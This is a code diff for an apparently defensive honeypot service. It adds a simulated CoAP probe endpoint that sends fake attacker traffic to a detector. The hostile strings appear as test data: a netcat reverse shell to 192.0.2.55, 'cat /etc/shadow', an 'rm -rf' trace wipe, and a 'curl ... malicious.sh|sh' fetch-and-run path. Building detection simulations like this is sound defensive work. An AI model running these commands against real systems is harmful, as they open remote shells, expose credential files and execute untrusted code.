@@ -53,6 +53,13 @@ ATTACK_IP_POOLS: Dict[str, List[str]] = {
         "203.0.113.140",
         "192.0.2.98",
     ],
+    "coap-probe": [
+        "198.51.100.133",
+        "198.51.100.168",
+        "203.0.113.111",
+        "203.0.113.220",
+        "192.0.2.145",
+    ],
 }
 
 EXPLOIT_PAYLOADS: Tuple[str, ...] = (
@@ -69,6 +76,14 @@ MQTT_EXPLOIT_PAYLOADS: Tuple[Tuple[str, str], ...] = (
     ("home/debug/shell", '{"exec": "/bin/sh -c rm -rf /tmp/traces"}'),
     ("home/gateway/exec", '{"payload": "nc -e /bin/sh 192.0.2.55 4444"}'),
     ("home/admin/credentials", '{"action": "dump_users", "format": "cat /etc/shadow"}'),
+)
+
+COAP_SIMULATION_PATHS: Tuple[str, ...] = (
+    "/.well-known/core",
+    "/sensors/temperature",
+    "/actuators/switch/override",
+    "/debug/firmware?cmd=curl%20-s%20http://malicious.sh|sh",
+    "/sensors/ambient",
 )
 
 
@@ -616,6 +631,50 @@ async def trigger_simulated_mqtt_exploit(
     return make_response(
         data=data,
         message=f"MQTT honey-topic exploit simulation ({mode}) completed for {', '.join(target_ips)}.",
+    )
+
+
+@router.post("/simulate/attack/coap-probe")
+async def trigger_simulated_coap_probe(
+    request: Request,
+    payload: Optional[AttackSimulationRequest] = Body(default=None),
+) -> Dict[str, Any]:
+    """Triggers a CoAP IoT decoy reconnaissance and exploit simulation across UDP port 5683."""
+    _ensure_simulated_mode(request)
+    detector = get_detector(request)
+    broadcaster = get_broadcaster(request)
+    target_ips, mode = _resolve_simulation_targets("coap-probe", payload)
+    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}
+
+    for attacker_ip in target_ips:
+        for uri in COAP_SIMULATION_PATHS:
+            cmd_payload = "cmd=cat /etc/shadow" if "curl" in uri else ""
+            detector.evaluate_coap_probe(
+                src_ip=attacker_ip,
+                uri_path=uri,
+                payload=cmd_payload,
+            )
+            await broadcaster.broadcast("honeypot_hit", {
+                "eventid": "coap.probe.hit",
+                "src_ip": attacker_ip,
+                "dst_port": 5683,
+                "protocol": "UDP:5683",
+                "uri": uri,
+                "timestamp": time.time(),
+            })
+            await asyncio.sleep(0.01)
+
+    data = _build_simulation_result(
+        detector,
+        target_ips,
+        mode,
+        len(target_ips) * len(COAP_SIMULATION_PATHS),
+        pre_banned,
+        extra={"target_port": "UDP:5683", "protocol": "CoAP (RFC 7252)"},
+    )
+    return make_response(
+        data=data,
+        message=f"CoAP decoy probe simulation ({mode}) completed for {', '.join(target_ips)}.",
     )
 
 
